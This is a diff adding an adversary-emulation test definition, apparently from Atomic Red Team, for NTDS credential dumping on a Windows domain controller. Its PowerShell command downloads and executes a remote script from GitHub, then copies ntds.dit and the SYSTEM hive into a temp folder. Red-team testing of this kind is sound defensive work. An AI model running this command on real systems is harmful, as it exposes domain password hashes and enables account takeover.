@@ -1,0 +1,46 @@
+- id: f57cb283-c131-4e2f-8a6c-363d575748b2
+  name: Copy NTDS in low level NTFS acquisition via MFT parsing
+  description: 'This test is intended to be run on a domain Controller.
+
+
+    UnderlayCopy is a PowerShell utility for low-level NTFS acquisition and dumping
+    protected, locked system artifacts (for example: SAM, SYSTEM, NTDS.dit, registry
+    hives, and other files that are normally inaccessible while Windows is running).'
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: 'OS Credential Dumping: NTDS'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1
+          -UseBasicParsing); Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit
+          -DestinationFile C:\Windows\Temp\ntds.dit; Underlay-Copy -Mode MFT -SourceFile
+          C:\Windows\System32\config\SYSTEM -DestinationFile C:\Windows\Temp\SYSTEM_HIVE'
+        cleanup: remove-item "#{extract_path}\ntds.dit" -force -erroraction silentlycontinue;
+          remove-item "#{extract_path}\SYSTEM_HIVE" -force -erroraction silentlycontinue
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1003.003
+  - credential-access
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      extract_path:
+        type: string
+        default: C:\Windows\Temp
+        description: Path for extracted NTDS.dit
+      script_url:
+        description: URL to UnderlayCopy script
+        type: url
+        default: https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1
+    technique_created: '2020-02-11T18:42:35.572Z'
+    atomic_guid: f57cb283-c131-4e2f-8a6c-363d575748b2
+    import_timestamp: '2026-02-13T04:22:43.246978Z'
